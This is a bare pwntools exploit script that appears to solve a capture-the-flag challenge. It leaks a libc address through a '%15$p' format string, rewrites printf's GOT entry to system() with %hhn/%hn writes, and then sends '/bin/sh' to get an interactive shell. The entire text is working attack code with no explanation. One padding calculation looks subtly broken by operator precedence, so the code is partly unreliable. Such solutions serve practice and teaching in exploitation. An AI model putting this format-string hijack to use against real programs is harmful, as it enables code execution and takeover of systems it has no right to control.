# script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
p = process([exe.path])

# gdb.attach(p, gdbscript = '''
# b*0x00000000004012bf
# c
# ''')


# input()

p.sendlineafter(b'>> ', b'1')
payload = b'%15$p'
p.sendlineafter(b'payload: ', payload)
p.recvuntil(b'submitted\n')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x230040
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

got_printf = exe.got['printf']
system = libc.sym['system']

log.info("printf: " + hex(got_printf))   
log.info("system: " + hex(system))  

p.sendlineafter(b'>> ', b'1')

payload = f'%{system & 0xff}c%10$hhn'.encode()
payload += f'%{(system >> 8) & 0xffff - (system & 0xff)}c%11$hn'.encode()
payload = payload.ljust(32, b'P')
payload += p64(got_printf)
payload += p64(got_printf + 1)
p.sendlineafter(b'payload: ', payload)

p.sendline(b'1')
p.sendline(b'/bin/sh\0')



p.interactive()
```
